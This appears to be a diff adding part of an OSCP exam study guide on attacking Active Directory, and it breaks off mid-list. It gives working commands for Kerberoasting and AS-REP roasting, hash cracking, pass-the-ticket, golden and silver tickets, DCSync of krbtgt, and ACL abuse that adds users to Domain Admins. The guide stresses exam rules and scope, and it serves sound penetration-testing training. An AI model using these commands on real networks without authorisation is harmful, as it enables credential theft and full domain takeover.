@@ -1,0 +1,909 @@
+<h2 id="ref-9-active-directory-full-attack-chain">9. ACTIVE DIRECTORY --- FULL ATTACK CHAIN</h2>
+<blockquote>
+<p>⚠️ <strong>Exam note:</strong> since Nov 2024 the AD set is "assumed compromise"
+--- you're handed a low-priv domain username + password on Day 1, goal
+is full DC compromise. So the AD SET itself starts at <strong>PHASE 2</strong>
+below. PHASE 1 (unauthenticated) is still a real skill --- it shows up
+on standalone machines that touch AD-adjacent services, and in real
+engagements --- just don't expect it to be how you get INTO the AD
+set.</p>
+</blockquote>
+<details id="ref-9-0a-issued-domain-credential-first-ten-minutes">
+<summary>🚦 9.0A Issued Domain Credential — First 10 Minutes + Failure Rescue</summary>
+<p><code>[DECISION:AD]</code> <code>[REQ:DOMAIN_CREDS]</code> <code>[AD:AUTH-RESCUE]</code></p>
+<blockquote>
+<p><strong>Goal:</strong> turn the issued account into verified domain visibility and one evidence-backed path. This is a sequence, not a spray. Run it only against known, in-scope services and stop when a stronger signal appears.</p>
+</blockquote>
+<h3>1. Establish ground truth before blaming the credential</h3>
+<pre class="ref-code"><code class="language-bash">export DOMAIN='domain.local'
+export DC='dc01.domain.local'
+export DC_IP='10.10.10.10'
+export BASE_DN='DC=domain,DC=local'
+export AUTH_USER='issued.user'
+export AUTH_PASS='issued-password'
+
+getent hosts "$DC"
+dig @"$DC_IP" _ldap._tcp.dc._msdcs."$DOMAIN" SRV +short
+sudo ntpdate -q "$DC_IP" 2&gt;/dev/null || date -u
+nmap -Pn -n -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 "$DC_IP" -oA ad-baseline</code></pre>
+<p>If Kerberos reports skew, verify the correct DC/UTC offset, then sync Kali and retry the <em>same</em> command. A transport/DNS/time failure says nothing about password validity.</p>
+<h3>2. Prove authentication, then enumerate rights</h3>
+<pre class="ref-code"><code class="language-bash">nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
+nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
+smbclient -L "//$DC_IP/" -U "$DOMAIN/$AUTH_USER"
+
+nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --shares
+nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --users
+nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --groups</code></pre>
+<p><strong>Identity format:</strong> use <code>-d DOMAIN</code>, <code>DOMAIN/user</code>, or <code>user@domain.local</code> for a domain identity. For a proven local account, omit the domain and use NetExec's <code>--local-auth</code>. Never treat successful authentication as proof of share access, WinRM logon rights or administrative execution.</p>
+<h3>3. Request high-signal domain data</h3>
+<pre class="ref-code"><code class="language-bash">impacket-GetUserSPNs "$DOMAIN/$AUTH_USER" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt  # password prompt; safe if password contains @/:
+# After saving confirmed usernames:
+impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -request -no-pass -usersfile users.txt -outputfile asrep.txt
+
+bloodhound-ce-python -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -dc "$DC" -ns "$DC_IP" -c All --zip
+certipy find -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -dc-ip "$DC_IP" -enabled -vulnerable -stdout</code></pre>
+<p>Inspect the current principal's outgoing control, group membership, sessions/admin rights, delegation, LAPS/gMSA visibility and certificate paths. Re-collect after every new identity or material directory change.</p>
+<h3>4. Decode the failure before switching tools</h3>
+<table>
+<thead><tr><th>Signal</th><th>What it establishes</th><th>Next decisive check</th></tr></thead>
+<tbody>
+<tr><td><code>KDC_ERR_PREAUTH_REQUIRED</code></td><td>Expected request flow; often confirms that the principal exists</td><td>Continue authenticated request; this alone is not AS-REP roastability</td></tr>
+<tr><td><code>KRB_AP_ERR_SKEW</code></td><td>Time failure, not password failure</td><td>Confirm DC/time, sync, retry unchanged</td></tr>
+<tr><td><code>KDC_ERR_S_PRINCIPAL_UNKNOWN</code></td><td>Hostname/SPN/service identity problem</td><td>Use FQDN; verify DNS and actual target</td></tr>
+<tr><td><code>KRB_AP_ERR_MODIFIED</code></td><td>Service cannot decrypt the ticket</td><td>Check FQDN/SPN/DNS, stale tickets and duplicate identity</td></tr>
+<tr><td><code>STATUS_LOGON_FAILURE</code> / <code>KDC_ERR_PREAUTH_FAILED</code></td><td>Presented identity/secret was rejected</td><td>Check Unicode, local/domain form and provenance once; stop repeated retries</td></tr>
+<tr><td><code>STATUS_ACCESS_DENIED</code> / WinRM authorization error</td><td>Resource/logon/action not authorized; credential may still be valid</td><td>Validate via SMB/LDAP/native client and inspect exact rights</td></tr>
+<tr><td><code>STATUS_BAD_NETWORK_NAME</code></td><td>Requested share is wrong</td><td>List shares, then use an exact returned name</td></tr>
+<tr><td>NetExec <code>[+]</code> without <code>Pwn3d!</code></td><td>Authentication accepted; admin execution not established</td><td>Enumerate permitted data/rights</td></tr>
+<tr><td><code>Pwn3d!</code></td><td>Protocol-specific administrative/code-execution capability indicated</td><td>Use the matching client; verify the new token with <code>whoami /all</code></td></tr>
+<tr><td>Unknown option/import/usage error</td><td>Local tool/version problem</td><td>Read installed help/version; do not discard the attack hypothesis</td></tr>
+</tbody>
+</table>
+<h3>5. Edge execution gate</h3>
+<ol>
+<li>Name the exact controlled source principal, target object and edge/right.</li>
+<li>Name the required host, protocol, session and token context.</li>
+<li>Prove the prerequisite with a read/query before a write.</li>
+<li>For any mutation: record current state, backup, minimal change, validation and rollback.</li>
+<li>Verify the resulting identity/access, re-enumerate, and re-collect the graph.</li>
+</ol>
+<p><strong>New-session rule:</strong> a new shell, remote protocol or logon method can produce a different token, groups, profile, network reachability and credential visibility. Baseline again instead of assuming equivalence.</p>
+</details>
+<details id="ref-9-0b-ad-ten-case-sanity-map">
+<summary>🧭 9.0B AD Ten-Case Sanity Map — OSCP-Safe</summary>
+<p><strong>Recognition map, not a checklist to execute top-to-bottom.</strong> Current evidence, exact prerequisites and current OffSec rules choose the next action.</p>
+<pre class="ref-code"><code class="language-text">PRACTICAL CHAIN
+context → identity → roast/visibility → graph → exact edge → usable access
+→ local privesc / credential discovery → re-collect → domain objective → evidence</code></pre>
+<table><thead><tr><th>#</th><th>Technique</th><th>OSCP stance</th><th>Decisive prerequisite / next thought</th></tr></thead><tbody>
+<tr><td>1</td><td>LLMNR / NBT-NS poisoning</td><td><strong>BLOCKED ACTION</strong></td><td>Do not poison/spoof. Responder analyze mode or passive capture only.</td></tr>
+<tr><td>2</td><td>Password spraying</td><td><strong>GUARDED</strong></td><td>Lockout policy first; tiny evidence-derived set; prefer one-host reuse first.</td></tr>
+<tr><td>3</td><td>Kerberoasting</td><td><strong>CORE</strong></td><td>SPN/service-account evidence → request TGS → crack offline if justified.</td></tr>
+<tr><td>4</td><td>AS-REP roasting</td><td><strong>CORE</strong></td><td>Confirmed user with pre-auth disabled; PREAUTH_REQUIRED alone is not roastability.</td></tr>
+<tr><td>5</td><td>NTLM relay / coercion</td><td><strong>RULE-SENSITIVE</strong></td><td>Not a default exam path. Never combine with prohibited spoofing/poisoning; re-check rules.</td></tr>
+<tr><td>6</td><td>Pass-the-Hash</td><td><strong>CORE</strong></td><td>Valid NTLM material + protocol support; prove authorization separately.</td></tr>
+<tr><td>7</td><td>ACL / ACE abuse</td><td><strong>CORE</strong></td><td>Prove exact edge; read/backup → minimum reversible change → verify → rollback.</td></tr>
+<tr><td>8</td><td>DCSync</td><td><strong>CONDITIONAL</strong></td><td>Replication rights proven; collect one required account first.</td></tr>
+<tr><td>9</td><td>AD CS abuse</td><td><strong>CORE / CONDITIONAL</strong></td><td>CA + template + enrollment/control prerequisites for the exact ESC path.</td></tr>
+<tr><td>10</td><td>Golden Ticket</td><td><strong>LATE / OPTIONAL</strong></td><td>KRBTGT material + domain SID; usually unnecessary once the objective is achieved.</td></tr>
+</tbody></table>
+<p><strong>Mental shortcut:</strong> use the “Top 10” idea only as a coverage reminder. The exam fast path is issued credential → DNS/time → SMB/LDAP → Kerberos visibility → BloodHound outgoing control → AD CS/exact edge → lateral access → local enumeration → re-collect → evidence.</p>
+</details>
+
+<details id="ref-9-1-ad-attack-flow-overview">
+<summary>🗺️ 9.1 AD Attack Flow Overview</summary>
+<p><code>[AD:FLOW]</code></p>
+<h3>2026 Exam Fast Path — Issued Domain Credentials</h3>
+<pre class="ref-code"><code class="language-text">ISSUED USER/PASSWORD
+        ↓
+identify domain + DC + DNS
+        ↓
+NXC: SMB / LDAP / WinRM / RDP rights
+        ↓
+shares + SYSVOL + scripts + user descriptions
+        ↓
+Kerberoast / AS-REP opportunities
+        ↓
+BloodHound collection
+        ↓
+OUTGOING CONTROL / ACL / GROUP / DELEGATION / LAPS / gMSA / AD CS
+        ↓
+get first shell
+        ↓
+LOCAL WINDOWS PRIVESC + CREDENTIAL SEARCH
+        ↓
+set up pivot if needed
+        ↓
+REPEAT ENUMERATION WITH EVERY NEW IDENTITY
+</code></pre>
+<p>Quick commands:</p>
+<pre class="ref-code"><code class="language-bash">nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
+nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --shares
+nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --users
+nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --groups
+# Validate one justified WinRM host first; expand only from observed reachability / Credential Debt.
+nxc winrm "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
+</code></pre>
+<p><strong>BloodHound rule:</strong> do not look only for "shortest path to Domain Admin". Inspect the current user's <strong>outgoing object control</strong>, group membership, writable objects, delegation relationships, session/admin relationships and certificate-related paths. Re-run/re-interpret the graph whenever you obtain a new identity.</p>
+<p><strong>Pivot rule:</strong> OffSec confirms that pivoting may be required in the AD set. Re-enumerate routes and reachable services after each foothold.</p>
+<pre class="ref-code"><code>PHASE 1: UNAUTHENTICATED (only when the surface exists)
+  ├── Enumerate: nmap, nxc, rpcclient, ldapsearch, enum4linux-ng
+  ├── EXAM: do not use LLMNR/NBT-NS poisoning or spoofing
+  ├── AS-REP request only for confirmed usernames
+  └── No blind spray: inspect policy and use only evidence-derived candidates
+
+PHASE 2: AUTHENTICATED (issued / discovered low-priv user)
+  ├── Prove DNS, time, SMB and LDAP before changing tools
+  ├── Shares, SYSVOL, scripts, descriptions, users, groups, computers
+  ├── Kerberoast / AS-REP material → save → identify → crack if justified
+  ├── BloodHound: current principal's outgoing control and shortest owned paths
+  ├── ACL, delegation, LAPS, gMSA and AD CS prerequisites
+  └── Translate one exact edge through the prove/act/verify/restore desk
+
+PHASE 3: LATERAL MOVEMENT
+  ├── Test each new credential only on appropriate exposed in-scope services
+  ├── Match password/hash/ticket/certificate to a supported protocol
+  ├── Record the protocol/session because token context changes
+  └── Re-enumerate and re-collect after every new identity or route
+
+PHASE 4: DOMAIN OBJECTIVE
+  ├── Validate the exact final edge and required service
+  ├── Prefer targeted collection (for example one DCSync user first)
+  ├── Capture proof/report evidence immediately when earned
+  └── Restore temporary mutations; do not add persistence for the report
+</code></pre>
+</details>
+<details id="ref-9-2-unauthenticated-enumeration">
+<summary>🔍 9.2 Unauthenticated Enumeration</summary>
+<pre class="ref-code"><code class="language-bash"># ── INITIAL RECON ─────────────────────────────────────────────
+# nxc fingerprint (even without creds):
+nxc smb $IP              # Shows: OS, hostname, domain, signing
+nxc smb $IP --shares -u '' -p ''   # Null session shares
+nxc smb $IP --shares -u 'guest' -p ''
+
+# Enum4linux (null session):
+enum4linux -a $IP 2&gt;/dev/null | tee loot/ad/enum4linux.txt
+
+# ── KERBRUTE USER ENUM ────────────────────────────────────────
+# Start with evidence-derived users/names; keep enumeration bounded.
+# Build users.txt from issued context, pages/docs/email, RPC/LDAP, or username-anarchy.
+kerbrute userenum -d $DOMAIN users.txt --dc $IP -o valid_users.txt
+# Do not jump to huge generic username lists unless a specific clue justifies it.
+
+# Names found in pages/docs/email but username format is unknown? Generate candidates FIRST.
+# Preferred: built-in AD username generator (offline, dedupe, convention inference).
+# Then validate them with Kerbrute/RPC/LDAP. Do not jump straight to password spraying.
+# Example input: Firstname,Lastname (CSV/TAB/space-delimited formats are supported).
+./username-anarchy --input-file names.txt > username_candidates.txt
+# Once one real format is known, reduce noise by selecting only that format, e.g.:
+./username-anarchy --input-file names.txt --select-format first.last > username_candidates.txt
+
+# ── RPC USER ENUM (null session) ──────────────────────────────
+rpcclient -U "" -N $IP -c "enumdomusers"
+rpcclient -U "" -N $IP -c "querydominfo"
+# RID cycling:
+for i in $(seq 1 1000); do
+  rpcclient -U "" -N $IP -c "queryuser $(printf '0x%x' $i)" 2&gt;/dev/null | grep "User Name"
+done
+nxc smb $IP -u '' -p '' --rid-brute | tee loot/ad/rid_cycle.txt
+
+# ── LDAP ANONYMOUS ────────────────────────────────────────────
+ldapsearch -x -H ldap://$IP -b "dc=$(echo $DOMAIN | tr '.' ','|sed 's/,/,dc=/g')" 2&gt;/dev/null | tee loot/ad/ldap_anon.txt
+# More structured:
+ldapdomaindump $IP -o loot/ad/ldapdump 2&gt;/dev/null   # No auth attempt
+</code></pre>
+</details>
+
+<details id="ref-9-2a-ad-username-candidate-generation">
+<summary>👤 9.2A AD Username Candidate Generation — Offline First</summary>
+<p><code>[AD:USERNAMES] [AD:KERBEROS]</code></p>
+<p><strong>Purpose:</strong> turn real names already discovered in scope into a <em>small hypothesis list</em>. Generation is offline. A generated string is not a valid account until Kerberos/LDAP/RPC proves it.</p>
+<pre class="ref-code"><code class="language-bash"># Preferred during the exam: Windows / AD → AD username candidate generator.
+# It normalizes names, deduplicates candidates, can infer a naming convention
+# from one observed account, and can export username_candidates.txt.
+
+# External fallback when already installed:
+./username-anarchy --input-file names.txt > username_candidates.txt
+# Once one real convention is known, generate only that convention:
+./username-anarchy --input-file names.txt --select-format first.last > username_candidates.txt
+
+# Validate USERNAMES only — this is not a password spray:
+kerbrute userenum -d "$DOMAIN" username_candidates.txt --dc "$DC_IP" -o loot/valid-users.txt
+
+# Alternatives when Kerbrute is unsuitable:
+rpcclient -U "" -N "$DC_IP" -c "enumdomusers"
+ldapsearch -x -H "ldap://$DC_IP" -b "$BASE_DN" '(objectClass=user)' sAMAccountName</code></pre>
+<div class="ref-note"><b>Pattern order:</b> begin with evidence-backed conventions such as <code>first.last</code>, <code>flast</code>, <code>firstl</code>, <code>firstlast</code>, or <code>first</code>. If one known employee maps to one pattern, stop generating unrelated formats and use that convention for the remaining names.</div>
+<div class="ref-warn"><b>20-character option:</b> the app can clamp candidates for a classic <code>sAMAccountName</code> hypothesis. Disable that option when evidence points to a different identifier/UPN convention. Do not assume a generated candidate exists, and do not convert username enumeration into uncontrolled password testing.</div>
+</details>
+<details id="ref-9-3-responder-analyze-mode-only">
+<summary>🛡️ 9.3 Responder — Analyze Mode Only</summary>
+<blockquote><p><strong>RULE-SENSITIVE:</strong> Responder may be used only for an action permitted by the current exam guide. Poisoning and spoofing are prohibited.</p></blockquote>
+<pre class="ref-code"><code class="language-bash"># Passive analysis only: inspect requests without answering them.
+sudo responder -I tun0 -A
+
+# Prefer packet-level validation when you only need visibility.
+sudo tcpdump -ni tun0 'udp port 5355 or udp port 137 or udp port 53'
+</code></pre>
+<p>Do not enable LLMNR/NBT-NS poisoning, WPAD responses, forced authentication, or relay workflows. If the required action is unclear, stop and re-check the official guide.</p>
+</details>
+<details id="ref-9-4-kerberos-attacks">
+<summary>🎫 9.4 Kerberos Attacks</summary>
+<p><code>[AD:KERBEROS]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── AS-REP ROASTING ───────────────────────────────────────────
+# Users with "Do not require Kerberos preauthentication" = vuln
+# No creds needed!
+impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -request -no-pass -usersfile valid_users.txt
+impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -request       # Enumerate + get hashes
+impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -request -outputfile asrep_hashes.txt
+# From Windows:
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+# Crack (hashcat -m 18200):
+hashcat -m 18200 asrep_hashes.txt rockyou.txt
+
+# ── KERBEROASTING ─────────────────────────────────────────────
+# With valid credentials:
+impacket-GetUserSPNs $DOMAIN/user -dc-ip $IP -request
+impacket-GetUserSPNs $DOMAIN/user -dc-ip $IP -request -outputfile kerb_hashes.txt
+impacket-GetUserSPNs $DOMAIN/user -dc-ip $IP -request -no-pass -k  # With ccache
+# From Windows:
+Rubeus.exe kerberoast /format:hashcat /outfile:kerb_hashes.txt
+Rubeus.exe kerberoast /user:targetuser /format:hashcat
+# Invoke-Kerberoast (PowerView):
+Invoke-Kerberoast -OutputFormat Hashcat | fl
+# Crack (hashcat -m 13100):
+hashcat -m 13100 kerb_hashes.txt rockyou.txt
+hashcat -m 13100 kerb_hashes.txt rockyou.txt -r best64.rule
+
+# ── TARGETED KERBEROAST (if GenericWrite) ─────────────────────
+# Set SPN on a target user account, then kerberoast them:
+Set-ADUser target -ServicePrincipalNames @{Add='http/fake'}
+impacket-GetUserSPNs $DOMAIN/user -dc-ip $IP -request -usersfile targetuser.txt
+# Clean up:
+Set-ADUser target -ServicePrincipalNames @{Remove='http/fake'}
+
+# ── PASS THE TICKET ───────────────────────────────────────────
+# Get TGT:
+impacket-getTGT $DOMAIN/user -dc-ip $IP           # → user.ccache
+impacket-getTGT $DOMAIN/user -hashes :NTLMHASH -dc-ip $IP
+export KRB5CCNAME=/path/to/user.ccache
+# Use with impacket:
+impacket-psexec $DOMAIN/user@target -no-pass -k
+impacket-smbclient $DOMAIN/user@target -no-pass -k
+impacket-wmiexec $DOMAIN/user@target -no-pass -k
+# From Windows — Rubeus:
+# Rubeus has no interactive password prompt. If a password-only Windows path is
+# necessary, substitute it only at execution time and do NOT save the literal
+# secret in notes, Command Journal, screenshots, or browser-persisted state.
+Rubeus.exe asktgt /user:&lt;USER&gt; /password:&lt;PASSWORD&gt; /domain:&lt;DOMAIN&gt; /dc:&lt;DC_FQDN&gt; /ptt
+Rubeus.exe ptt /ticket:&lt;KIRBI_OR_BASE64&gt;
+klist    # Verify the ticket actually landed in this logon session
+
+# ── OVERPASS THE HASH ─────────────────────────────────────────
+# Convert NTLM hash to Kerberos ticket:
+# Mimikatz:
+sekurlsa::pth /user:user /domain:$DOMAIN /ntlm:NTLMHASH /run:cmd.exe
+# New cmd window → now has Kerberos ticket
+# From Kali:
+impacket-getTGT $DOMAIN/user -hashes :NTLMHASH -dc-ip $IP
+export KRB5CCNAME=user.ccache
+impacket-psexec $DOMAIN/user@DC -no-pass -k
+
+# ── SILVER TICKET ─────────────────────────────────────────────
+# Forge service ticket (requires service account hash + SID)
+# More stealthy than golden (no DC communication)
+impacket-ticketer -nthash SERVICEHASH -domain-sid S-1-5-21-xxx -domain $DOMAIN -spn cifs/server.domain.com administrator
+export KRB5CCNAME=administrator.ccache
+impacket-psexec $DOMAIN/administrator@server.domain.com -no-pass -k
+
+# ── GOLDEN TICKET ─────────────────────────────────────────────
+# Requires: KRBTGT hash + Domain SID
+# Get domain SID:
+impacket-lookupsid $DOMAIN/user@$IP | grep "Domain SID"
+# Get KRBTGT hash (DCSync required — need DA or replication rights):
+impacket-secretsdump $DOMAIN/admin@$IP -just-dc-user krbtgt
+# Forge:
+impacket-ticketer -nthash KRBTGT_NTLM -domain-sid S-1-5-21-xxx -domain $DOMAIN administrator
+export KRB5CCNAME=administrator.ccache
+impacket-psexec $DOMAIN/administrator@$DC -no-pass -k
+# Mimikatz golden ticket:
+kerberos::golden /domain:$DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt
+
+# ── DIAMOND/SAPPHIRE TICKET (newer, harder to detect) ─────────
+Rubeus.exe diamond /tgtdeleg /ticketuser:user /ticketuserid:500 /groups:512
+</code></pre>
+</details>
+
+<details id="ref-9-4a-rubeus-material-router">
+<summary>🧭 9.4A Rubeus — Windows-Side Kerberos Material Router</summary>
+<p><strong>Use Rubeus when the useful Kerberos context is on a Windows foothold.</strong> From Kali, Impacket is usually cleaner for password-prompted TGT/TGS work. Do not switch tools because of a Kerberos error until DNS, FQDN, DC identity and clock skew are checked.</p>
+<table><thead><tr><th>What you actually have</th><th>First Rubeus action</th><th>Success means</th><th>Next move</th></tr></thead><tbody>
+<tr><td>Existing Windows logon/session</td><td><code>klist</code> → <code>Rubeus.exe triage</code></td><td>Tickets/logon context are visible</td><td>Use the existing ticket/session before minting anything new</td></tr>
+<tr><td>Confirmed usernames, no password</td><td><code>Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt</code></td><td>A roastable account actually returns hash material</td><td>Crack offline only if justified; PREAUTH_REQUIRED alone is not roastability</td></tr>
+<tr><td>Valid domain context + specific SPN/service account</td><td><code>Rubeus.exe kerberoast /user:&lt;TARGET_USER&gt; /format:hashcat /nowrap /outfile:kerb_hashes.txt</code></td><td>A TGS hash is returned</td><td>Crack offline; reuse only if the password is recovered</td></tr>
+<tr><td>NTLM hash</td><td><code>Rubeus.exe asktgt /user:&lt;USER&gt; /rc4:&lt;NTLM&gt; /domain:&lt;DOMAIN&gt; /dc:&lt;DC_FQDN&gt; /ptt</code></td><td><code>klist</code> shows a TGT in the intended session</td><td>Use Kerberos-aware access against the exact host/SPN</td></tr>
+<tr><td>AES256 key</td><td><code>Rubeus.exe asktgt /user:&lt;USER&gt; /aes256:&lt;AES256&gt; /domain:&lt;DOMAIN&gt; /dc:&lt;DC_FQDN&gt; /ptt</code></td><td>TGT is present</td><td>Continue with the exact Kerberos service path</td></tr>
+<tr><td><code>.kirbi</code> / base64 TGT or TGS</td><td><code>Rubeus.exe ptt /ticket:&lt;KIRBI_OR_BASE64&gt;</code></td><td>Ticket is injected into the current logon session</td><td><code>klist</code>, then test the exact service/FQDN</td></tr>
+<tr><td>Username + password only</td><td>Prefer <code>impacket-getTGT "$DOMAIN/$AUTH_USER" -dc-ip "$DC_IP"</code> from Kali so the password is prompted</td><td>TGT/ccache exists without putting the password in a saved command</td><td>Export <code>KRB5CCNAME</code>; use <code>-k -no-pass</code></td></tr>
+<tr><td>Delegation/S4U edge from BloodHound</td><td><strong>Do not guess a generic s4u command</strong></td><td>Source account, delegation type, target SPN and impersonated user are proven</td><td>Open the delegation/ACL workflow and build from those prerequisites</td></tr>
+</tbody></table>
+<pre class="ref-code"><code class="language-powershell"># Read-only inventory first
+klist
+Rubeus.exe triage
+Rubeus.exe dump /nowrap
+
+# Ticket injection / verification
+Rubeus.exe ptt /ticket:&lt;KIRBI_OR_BASE64&gt;
+klist
+
+# If current ticket state is confusing, prefer a fresh logon/process context.
+# Do not blindly purge useful tickets in the only working session.</code></pre>
+<p><strong>Failure decoder:</strong> <code>KRB_AP_ERR_SKEW</code> → time; <code>KDC_ERR_S_PRINCIPAL_UNKNOWN</code> → FQDN/SPN/DNS; <code>KRB_AP_ERR_MODIFIED</code> → wrong service identity, stale ticket, or duplicate SPN context; usage/import errors → read installed Rubeus help before changing the attack hypothesis.</p>
+</details>
+
+<details id="ref-9-4b-password-state-recovery">
+<summary>🔁 9.4B Password Expired / Must Change — Mutation-Safe Recovery</summary>
+<p>Use this only after an explicit signal such as <code>STATUS_PASSWORD_MUST_CHANGE</code>, <code>STATUS_PASSWORD_EXPIRED</code>, or <code>KDC_ERR_KEY_EXPIRED</code>. That often means the credential is <strong>valid but policy-restricted</strong>; do not discard it or start spraying alternatives.</p>
+<pre class="ref-code"><code class="language-bash"># Read installed syntax first. Omitting password/newpass keeps them out of the saved command and lets the tool prompt.
+impacket-changepasswd -h
+
+# Self-service change with current password (SAMR over SMB is the normal default).
+impacket-changepasswd "$DOMAIN/$AUTH_USER@$DC"
+
+# Existing Kerberos/ccache context, when kpasswd is supported:
+KRB5CCNAME=/absolute/path/user.ccache \
+  impacket-changepasswd -protocol kpasswd "$DOMAIN/$AUTH_USER@$DC" -k -no-pass -dc-ip "$DC_IP"</code></pre>
+<p><strong>Before mutating:</strong> record the exact error, principal, target/DC, credential provenance and time. A password change can invalidate sessions/tickets and password-history policy may prevent restoring the old value. <code>-reset</code> is a different operation requiring a proven reset/admin right—do not use it merely because self-change failed. After success, update the Credential Matrix once and revalidate only the blocked service.</p>
+</details>
+<details id="ref-9-5-bloodhound-complete-workflow">
+<summary>🔎 9.5 BloodHound --- Complete Workflow</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE ENUMERATION</strong> · ✓ FIRST CHOICE for AD graph analysis · <code>[REQ:DOMAIN_CREDS]</code> for normal credentialed collection.</p>
+</blockquote>
+<p><code>[AD:BLOODHOUND]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── CURRENT BLOODHOUND CE COLLECTION ──────────────────────────
+# ✓ PRIMARY from Kali for BloodHound CE:
+bloodhound-ce-python -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN -ns $DC_IP -c All --zip
+# If DNS/DC discovery is unreliable, give the DC hostname explicitly:
+bloodhound-ce-python -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN -dc $DC -ns $DC_IP -c All --zip
+
+# △ LEGACY ONLY:
+# bloodhound-python ...   # Collector for BloodHound Legacy, NOT the CE collector.
+# Do not mix Legacy and CE collectors/UI by assumption.
+
+# ✓ Cross-platform CE alternative — RustHound-CE:
+rusthound-ce -d "$DOMAIN" -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -i "$DC_IP" -z
+# Use installed rusthound-ce -h as syntax authority.
+# ✓ From Windows — SharpHound CE:
+SharpHound.exe -c All --outputdirectory C:\Users\Public\ --zipfilename loot.zip
+# If you need repeated session collection:
+SharpHound.exe --CollectionMethods Session --Loop
+
+# ── CURRENT KALI BLOODHOUND CE STARTUP ────────────────────────
+# First installation only:
+sudo bloodhound-setup
+
+# Normal startup:
+bloodhound-start
+
+# Current Kali marks the old `bloodhound` launcher as deprecated.
+# Import the generated ZIP into BloodHound CE.
+
+# ── KEY QUERIES ───────────────────────────────────────────────
+# Pre-built:
+"Find all Domain Admins"
+"Find Shortest Paths to Domain Admins"
+"Find Principals with DCSync Rights"
+"Find Computers with Unsupported Operating Systems"
+"Shortest Path from Owned Principals"
+"Find AS-REP Roastable Users"
+"Find Kerberoastable Users with Most Privileges"
+"List all Kerberoastable Accounts"
+"Find Users with Foreign Domain Group Membership"
+"Find Dangerous Rights for Domain Users"
+
+# Custom Cypher queries (in Raw Query box):
+# Users with local admin:
+MATCH (m:Computer) WHERE m.operatingsystem =~ '(?i).*(7|2008|xp|vista).*' RETURN m
+
+# Path from user to DA:
+MATCH (u:User {name:"USER@DOMAIN"}), (g:Group {name:"DOMAIN ADMINS@DOMAIN"}), p=shortestPath((u)-[*1..]-&gt;(g)) RETURN p
+
+# All machines current user can reach:
+MATCH (c:Computer), (u:User {name:"USER@DOMAIN"}), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p
+
+# ── MARK AS OWNED ─────────────────────────────────────────────
+# Right-click user/computer → Mark as Owned
+# Then: "Shortest Path from Owned" → finds exact attack path
+
+# ── BLOODHOUND ATTACK PATHS ───────────────────────────────────
+# GenericAll on User:
+net user victim NewPass123! /domain
+# GenericAll on Group:
+net group "Domain Admins" lowpriv /add /domain
+# GenericAll on Computer:  → RBCD (Resource-Based Constrained Delegation)
+# WriteDACL → grant DCSync:
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity user -Rights DCSync
+# WriteOwner → take ownership:
+Set-DomainObjectOwner -Identity target -OwnerIdentity attacker
+# ForceChangePassword:
+Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString "NewPass" -AsPlainText -Force)
+</code></pre>
+</details>
+<details id="ref-9-6-ad-attack-path-methodology-build-the-graph-don-t-just-run-tools">
+<summary>➜ 9.6 AD Attack-Path Methodology --- Build the Graph, Don't Just Run Tools</summary>
+<pre class="ref-code"><code class="language-text">LOW-PRIV DOMAIN USER
+        ↓
+IDENTIFY DOMAIN / DC / DNS
+        ↓
+USERS + GROUPS + COMPUTERS
+        ↓
+SMB + LDAP + KERBEROS
+        ↓
+SPNs / AS-REP / PASSWORD REUSE
+        ↓
+ACLs / DELEGATION / GPOs
+        ↓
+LAPS / gMSA
+        ↓
+SHADOW CREDENTIALS
+        ↓
+AD CS / ESC1–ESC17
+        ↓
+RELAY / COERCION ONLY WITH AN EXACT, CURRENT-RULE-CHECKED HYPOTHESIS
+        ↓
+LATERAL MOVEMENT
+        ↓
+DC / DCSYNC / DOMAIN COMPROMISE
+</code></pre>
+<h3>First-pass commands</h3>
+<pre class="ref-code"><code class="language-bash">nxc smb $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN
+nxc ldap $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN
+nxc ldap $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN --users
+nxc ldap $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN --groups
+nxc ldap $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d $DOMAIN --computers
+</code></pre>
+<h3>Credentials → service matrix</h3>
+<p>Whenever you find credentials, test them against appropriate in-scope
+services:</p>
+<pre class="ref-code"><code class="language-text">SMB
+LDAP
+WinRM
+RDP
+MSSQL
+SSH
+FTP
+HTTP applications
+VPN
+Shares
+Service accounts
+</code></pre>
+<p>Also identify whether the material is:</p>
+<pre class="ref-code"><code class="language-text">Password
